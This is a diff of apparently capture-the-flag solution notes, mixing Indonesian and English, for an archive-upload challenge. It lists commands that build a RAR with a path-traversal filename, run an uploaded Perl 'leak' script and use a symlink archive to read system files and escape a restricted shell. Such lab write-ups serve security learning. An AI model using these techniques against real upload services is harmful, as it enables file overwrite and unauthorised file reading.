@@ -8,7 +8,8 @@ $ nano time.sh
 
 pwd
 ls
-cat Flagnya_bukan_dimari.txt
+cat Flagnya_bukan_dimari.txt --> denied
+perl ./storage/fd331ec8087045bc/uploads/others/leak.pl
 =================================
 
 2. construct the bomb
@@ -20,11 +21,18 @@ $ rar rn evil.rar time.sh "../../time.sh"
 
 > upload
 > go back to '/'
+> cari tau session directory nya
+> upload perl script (leak.pl)
 > get the location of the flag
 
-# step 2 -> keluar dari rbash, pake zipslip symlink
+
+BISA JUGA (not tested):
+# step 2 -> keluar dari rbash, baca file
+
 $ touch /etc/spartan
 $ ln -s /etc/spartan symlink.txt
 $ rar a -ol more_evil.rar symlink.txt
 > upload
 > get the flag
+
+storage/<SESSID>/uploads/others/leak.pl
